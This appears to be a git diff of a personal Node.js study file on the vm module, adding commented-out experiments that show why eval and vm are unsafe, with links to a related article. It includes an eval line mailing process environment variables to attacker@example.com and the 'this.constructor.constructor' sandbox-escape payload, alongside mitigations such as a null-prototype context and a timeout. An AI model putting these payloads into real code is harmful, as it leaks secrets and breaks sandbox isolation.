@@ -2,42 +2,77 @@ const vm = require('vm')
 /* 
 eval к которому можно прибивать контекст
 Не секьюрно
-
-Частый случай применения выполнять код в разных контекстах(eval.call())
 */
-// const context = { a: 1, b: 2 }
-// vm.createContext(context)
-const code = 'console.log("abc")'
-// vm.runInThisContext(code)
-const a = new vm.Script(code)
-// a.runInThisContext()
-// new vm.Script(code[, options])
-// vm.Script (Script) = class в котором прекомпиленый скрипт который в последствии можно юзать
 
-// script.createCachedData()
-// Returns: <Buffer>
-// Creates a code cache that can be used with the Script constructor's cachedData option. Returns a Buffer. This method may be called at any time and any number of times.
+/*  
+eval('while(true) console.log(1)')
+console.log('The application goes on...')
+*/
 
-const context = {
-  animal: 'cat',
-  count: 2,
-  a: function () {
-    console.log(this.animal)
-  },
-  b: function () {
-    console.log(this.count)
-  }
-}
+/* 
+eval('process.exit(0)')
+console.log('The application goes on...')
+*/
 
-const script = new vm.Script('count +=1; name = "kitty";')
+/* 
+eval('require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))')
+console.log('The application goes on...')
+*/
 
-vm.createContext(context)
-const cont2 = { animal: 'sobaka', count: 35 }
-// vm.createContext(cont2)
-// for (let i = 0; i < 10; ++i) {
-//   script.runInContext(context)
-//   script.runInContext(cont2)
-// }
-const script2 = new vm.Script('this.b();this.a()')
-script2.runInContext(context)
-// console.log(context)
+/* 
+eval('eval = undefined')
+console.log('The application goes on...')
+*/
+
+/* 
+const a = new Array(2)
+console.log(a)
+vm.runInNewContext(
+  `const a = new Array(2);console.log(a);Array = null
+  // const b = new Array(2)
+  `,
+  { Array, console }
+)
+const b = new Array(2)
+console.log(b)
+*/
+
+/* 
+vm.runInThisContext('process.exit(0)')
+console.log("alo")
+*/
+
+/*
+ vm.runInNewContext('process.exit(0)') // error
+console.log('alo') 
+*/
+
+/* vm.runInNewContext(
+  "this.constructor.constructor('return process')().exit()"
+)
+console.log('The app goes on...')
+*/
+
+/* 
+let obj = Object.create(null)
+obj.a = 1
+vm.runInNewContext(
+  "this.constructor.constructor('return process')().exit()",
+  obj
+) //error
+*/
+
+
+/* vm.runInNewContext(
+  'let i = 0;while(true){console.log(i++)}',
+  { console },
+  { timeout: 500 }
+)
+*/
+
+
+/* 
+Links:
+https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
+https://node.readthedocs.io/en/latest/api/vm/
+*/
